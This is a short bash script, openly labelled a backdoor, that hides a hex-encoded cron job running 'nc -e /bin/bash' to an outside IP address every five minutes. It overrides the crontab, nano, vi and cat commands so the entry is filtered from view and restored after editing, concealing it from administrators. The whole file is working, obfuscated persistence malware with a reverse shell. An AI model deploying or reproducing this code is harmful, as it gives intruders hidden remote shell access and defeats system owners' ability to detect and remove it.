# Hex encoded shellcode

# ---------------------

# The Folder the CronJob is hiden in.

# /var/spool/cron/crontabs/ == \x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f

# ---------------------

# The backdoor script.

# /root/bd.sh == \x6E\x63\x20\x2D\x65\x20\x2F\x62\x69\x6E\x2F\x62\x61\x73\x68\x20\x31\x39\x32\x2E\x31\x36\x38\x2E\x34\x31\x2E\x31\x32\x38

# ---------------------

# Search term to trigger the cloaking fuction.

# cron == \x63\x72\x6f\x6e

# ---------------------

crontab() {

    local S="$(echo -e '\x2A\x2F\x35\x20\x2A\x20\x2A\x20\x2A\x20\x2A\x20\x6E\x63\x20\x2D\x65\x20\x2F\x62\x69\x6E\x2F\x62\x61\x73\x68\x20\x31\x39\x32\x2E\x31\x36\x38\x2E\x34\x31\x2E\x31\x32\x38\x20\x35\x30\x30\x33\x32')"

    local L="$(echo -e '\x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f')"

    case "$*" in

        (*-l*) command crontab "$@"|grep -v "${S}" ;;

        (*-e*) local H=$(grep "${S}" "${L}${USER}");local O=$(grep -v "${S}" "${L}${USER}");echo "$O" >"${L}${USER}";command crontab -e;echo "${H}" >> "${L}${USER}";;

        (*) command crontab "$@";;

    esac

}

nano() {

    local C="$(echo -e '\x63\x72\x6f\x6e')"

    local S="$(echo -e '\x2A\x2F\x35\x20\x2A\x20\x2A\x20\x2A\x20\x2A\x20\x6E\x63\x20\x2D\x65\x20\x2F\x62\x69\x6E\x2F\x62\x61\x73\x68\x20\x31\x39\x32\x2E\x31\x36\x38\x2E\x34\x31\x2E\x31\x32\x38\x20\x35\x30\x30\x33\x32')"

    local L="$(echo -e '\x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f')"

    case "$*" in

        (*"${C}"*) local H=$(grep "${S}" "${L}${USER}");local O=$(grep -v "${S}" "${L}${USER}");echo "$O" >"${L}${USER}";command nano "$@";echo "${H}" >> "${L}${USER}";;

        (*) command nano "$@";;

    esac

}

vi() {

    local C="$(echo -e '\x63\x72\x6f\x6e')"

    local S="$(echo -e '\x2A\x2F\x35\x20\x2A\x20\x2A\x20\x2A\x20\x2A\x20\x6E\x63\x20\x2D\x65\x20\x2F\x62\x69\x6E\x2F\x62\x61\x73\x68\x20\x31\x39\x32\x2E\x31\x36\x38\x2E\x34\x31\x2E\x31\x32\x38\x20\x35\x30\x30\x33\x32')"

    local L="$(echo -e '\x2f\x76\x61\x72\x2f\x73\x70\x6f\x6f\x6c\x2f\x63\x72\x6f\x6e\x2f\x63\x72\x6f\x6e\x74\x61\x62\x73\x2f')"

    case "$*" in

        (*"${C}"*) local H=$(grep "${S}" "${L}${USER}");local O=$(grep -v "${S}" "${L}${USER}");echo "$O" >"${L}${USER}";command vi "$@";echo "${H}" >> "${L}${USER}";;

        (*) command vi "$@";;

    esac

}

cat() {

    local C="$(echo -e '\x63\x72\x6f\x6e')"

    local S="$(echo -e '\x2A\x2F\x35\x20\x2A\x20\x2A\x20\x2A\x20\x2A\x20\x6E\x63\x20\x2D\x65\x20\x2F\x62\x69\x6E\x2F\x62\x61\x73\x68\x20\x31\x39\x32\x2E\x31\x36\x38\x2E\x34\x31\x2E\x31\x32\x38\x20\x35\x30\x30\x33\x32')"

    case "$*" in

        (*"${C}"*) command cat "$@"|grep -v "${S}";;

        (*) command cat "$@";;

    esac

}

# ---------------------


